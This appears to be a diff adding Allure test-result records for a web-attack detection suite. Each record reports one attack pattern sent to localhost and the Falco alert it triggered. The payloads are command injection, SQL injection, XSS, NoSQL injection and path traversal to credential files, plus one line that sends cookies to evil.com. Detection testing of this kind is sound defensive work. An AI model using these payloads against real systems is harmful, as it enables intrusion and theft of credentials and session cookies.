+15:09:22.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_001-1765465762329-kl3oah pattern_id=PATH_BASIC_001 uri=/?q=../ client=127.0.0.1
+```","2","test_e2e_with_logs[056_PATH_BASIC_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_015` |
+| **Name** | AND operator with whoami |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `&& whoami`
+- **Encoded**: `%26%26%20whoami`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~3000ms
+- **Timestamp**: 15:09:34.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_015-1765465774347-qh1p2 pattern_id=CMD_BASIC_015 uri=/?q=%26%26%20whoami client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:34.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_015-1765465774347-qh1p2 pattern_id=CMD_BASIC_015 uri=/?q=%26%26%20whoami client=127.0.0.1
+```","1","test_e2e_with_logs[089_CMD_BASIC_015]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_010` |
+| **Name** | Video source onerror XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<video><source onerror=alert('XSS')>`
+- **Encoded**: `%3Cvideo%3E%3Csource%20onerror%3Dalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~16000ms
+- **Timestamp**: 15:09:21.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_010-1765465761841-r2sojl pattern_id=XSS_REFL_010 uri=/?q=%3Cvideo%3E%3Csource%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:21.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_010-1765465761841-r2sojl pattern_id=XSS_REFL_010 uri=/?q=%3Cvideo%3E%3Csource%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[045_XSS_REFL_010]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_009` |
+| **Name** | Network interface configuration |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `; ifconfig`
+- **Encoded**: `%3B%20ifconfig`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~6000ms
+- **Timestamp**: 15:09:31.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1765465771339-krz4ns pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:31.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_009-1765465771339-krz4ns pattern_id=CMD_BASIC_009 uri=/?q=%3B%20ifconfig client=127.0.0.1
+```","2","test_e2e_with_logs[083_CMD_BASIC_009]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_BASIC_002` |
+| **Name** | Double parent directory traversal |
+| **Category** | PATH |
+| **Subcategory** | basic_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../`
+- **Encoded**: `../../`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_002-1765465762830-bu3g8u pattern_id=PATH_BASIC_002 uri=/?q=../../ client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:22.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_002-1765465762830-bu3g8u pattern_id=PATH_BASIC_002 uri=/?q=../../ client=127.0.0.1
+```","1","test_e2e_with_logs[057_PATH_BASIC_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_008` |
+| **Name** | Textarea onfocus XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<textarea onfocus=alert('XSS') autofocus>`
+- **Encoded**: `%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~17000ms
+- **Timestamp**: 15:09:20.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1765465760838-3gz6jj pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:20.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_008-1765465760838-3gz6jj pattern_id=XSS_REFL_008 uri=/?q=%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[043_XSS_REFL_008]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_008` |
+| **Name** | Kernel version information |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `|| cat /proc/version`
+- **Encoded**: `%7C%7C%20cat%20/proc/version`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~7000ms
+- **Timestamp**: 15:09:30.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_008-1765465770839-o4xrrg pattern_id=CMD_BASIC_008 uri=/?q=%7C%7C%20cat%20/proc/version client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:30.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_008-1765465770839-o4xrrg pattern_id=CMD_BASIC_008 uri=/?q=%7C%7C%20cat%20/proc/version client=127.0.0.1
+```","1","test_e2e_with_logs[082_CMD_BASIC_008]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_015` |
+| **Name** | Sleep with comment obfuscation |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `/**/SLEEP/**/(5)`
+- **Encoded**: `/%2A%2A/SLEEP/%2A%2A/%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~18000ms
+- **Timestamp**: 15:09:19.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1765465759349-60946u pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:19.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1765465759349-60946u pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[024_SQLI_TIME_015]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ABS_003` |
+| **Name** | Root SSH authorized keys access |
+| **Category** | PATH |
+| **Subcategory** | absolute_paths |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `/root/.ssh/authorized_keys`
+- **Encoded**: `/root/.ssh/authorized_keys`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~7000ms
+- **Timestamp**: 15:09:30.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_003-1765465770850-74onw pattern_id=PATH_ABS_003 uri=/?q=/root/.ssh/authorized_keys client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:30.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_003-1765465770850-74onw pattern_id=PATH_ABS_003 uri=/?q=/root/.ssh/authorized_keys client=127.0.0.1
+```","1","test_e2e_with_logs[053_PATH_ABS_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_003` |
+| **Name** | AND-based boolean injection |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `' AND '1'='1`
+- **Encoded**: `%27%20AND%20%271%27%3D%271`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~17000ms
+- **Timestamp**: 15:09:20.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_003-1765465760853-ls87q pattern_id=SQLI_BOOL_003 uri=/?q=%27%20AND%20%271%27%3D%271 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_003-1765465760853-ls87q pattern_id=SQLI_BOOL_003 uri=/?q=%27%20AND%20%271%27%3D%271 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[003_SQLI_BOOL_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_013` |
+| **Name** | onmouseover event handler injection |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<a onmouseover=alert(1)>hover</a>`
+- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1765465763344-1ij68w pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1765465763344-1ij68w pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[048_XSS_REFL_013]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_UNION_001` |
+| **Name** | Basic UNION SELECT with NULL |
+| **Category** | SQLI |
+| **Subcategory** | union_based |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `UNION SELECT NULL`
+- **Encoded**: `UNION%20SELECT%20NULL`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_001-1765465764863-yjzgsb pattern_id=SQLI_UNION_001 uri=/?q=UNION%20SELECT%20NULL client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_001-1765465764863-yjzgsb pattern_id=SQLI_UNION_001 uri=/?q=UNION%20SELECT%20NULL client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[028_SQLI_UNION_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_015` |
+| **Name** | data: protocol injection |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<object data=""data:text/html,<script>alert(1)</script>"">`
+- **Encoded**: `%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_015-1765465764346-jpo40k pattern_id=XSS_REFL_015 uri=/?q=%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_015-1765465764346-jpo40k pattern_id=XSS_REFL_015 uri=/?q=%3Cobject%20data%3D%22data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[050_XSS_REFL_015]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_010` |
+| **Name** | URL encoded extended sleep |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP%2810%29`
+- **Encoded**: `SLEEP%252810%2529`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~21000ms
+- **Timestamp**: 15:09:16.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1765465756843-ffo4yp pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:16.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_010-1765465756843-ffo4yp pattern_id=SQLI_TIME_010 uri=/?q=SLEEP%252810%2529 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[019_SQLI_TIME_010]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_004` |
+| **Name** | PostgreSQL sleep function |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `pg_sleep(5)`
+- **Encoded**: `pg_sleep%285%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~24000ms
+- **Timestamp**: 15:09:13.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_004-1765465753834-9rno6 pattern_id=SQLI_TIME_004 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:13.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_004-1765465753834-9rno6 pattern_id=SQLI_TIME_004 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[013_SQLI_TIME_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_009` |
+| **Name** | Keygen onfocus XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<keygen onfocus=alert('XSS') autofocus>`
+- **Encoded**: `%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~16000ms
+- **Timestamp**: 15:09:21.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_009-1765465761339-echwu pattern_id=XSS_REFL_009 uri=/?q=%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:21.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_009-1765465761339-echwu pattern_id=XSS_REFL_009 uri=/?q=%3Ckeygen%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[044_XSS_REFL_009]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_NULL_001` |
+| **Name** | Null byte injection in path |
+| **Category** | PATH |
+| **Subcategory** | null_byte |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `../etc/passwd%00.jpg`
+- **Encoded**: `../etc/passwd%2500.jpg`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NULL_001-1765465773356-7xezx pattern_id=PATH_NULL_001 uri=/?q=../etc/passwd%2500.jpg client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NULL_001-1765465773356-7xezx pattern_id=PATH_NULL_001 uri=/?q=../etc/passwd%2500.jpg client=127.0.0.1
+```","1","test_e2e_with_logs[073_PATH_NULL_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_006` |
+| **Name** | Input onfocus XSS with autofocus |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<input onfocus=alert('XSS') autofocus>`
+- **Encoded**: `%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~18000ms
+- **Timestamp**: 15:09:19.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_006-1765465759836-mshqp pattern_id=XSS_REFL_006 uri=/?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:19.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_006-1765465759836-mshqp pattern_id=XSS_REFL_006 uri=/?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[041_XSS_REFL_006]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `EMRG_MONGO_005` |
+| **Name** | MongoDB JavaScript code injection |
+| **Category** | OTHER |
+| **Subcategory** | mongodb_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `'; return db.users.find(); //`
+- **Encoded**: `%27%3B%20return%20db.users.find%28%29%3B%20//`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~3000ms
+- **Timestamp**: 15:09:34.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1765465774335-xd7rje pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:34.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1765465774335-xd7rje pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
+```","2","test_e2e_with_logs[100_EMRG_MONGO_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_DOM_002` |
+| **Name** | innerHTML manipulation |
+| **Category** | XSS |
+| **Subcategory** | dom_based_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `innerHTML='<img src=x onerror=alert(1)>'`
+- **Encoded**: `innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~11000ms
+- **Timestamp**: 15:09:26.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_002-1765465766852-l6kjfa pattern_id=XSS_DOM_002 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:26.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_002-1765465766852-l6kjfa pattern_id=XSS_DOM_002 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[031_XSS_DOM_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_004` |
+| **Name** | Iframe javascript scheme XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<iframe src=javascript:alert('XSS')>`
+- **Encoded**: `%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~19000ms
+- **Timestamp**: 15:09:18.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1765465758833-u94ug pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:18.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1765465758833-u94ug pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[039_XSS_REFL_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_017` |
+| **Name** | PostgreSQL pg_sleep with decimal |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `pg_sleep(5.5)`
+- **Encoded**: `pg_sleep(5.5)`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_017-1765465762358-qbtj5o pattern_id=SQLI_TIME_017 uri=/?q=pg_sleep(5.5) client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:22.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_017-1765465762358-qbtj5o pattern_id=SQLI_TIME_017 uri=/?q=pg_sleep(5.5) client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[026_SQLI_TIME_017]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_DOM_001` |
+| **Name** | document.location manipulation |
+| **Category** | XSS |
+| **Subcategory** | dom_based_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
+- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~11000ms
+- **Timestamp**: 15:09:26.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1765465766351-7xssk pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:26.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1765465766351-7xssk pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[030_XSS_DOM_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_008` |
+| **Name** | URL encoded WAITFOR DELAY |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `WAITFOR%20DELAY%20%270%3A0%3A5%27`
+- **Encoded**: `WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~22000ms
+- **Timestamp**: 15:09:15.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1765465755840-q2ep3p pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:15.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1765465755840-q2ep3p pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[017_SQLI_TIME_008]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_008` |
+| **Name** | Root bash history access |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `../../../../root/.bash_history`
+- **Encoded**: `../../../../root/.bash_history`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
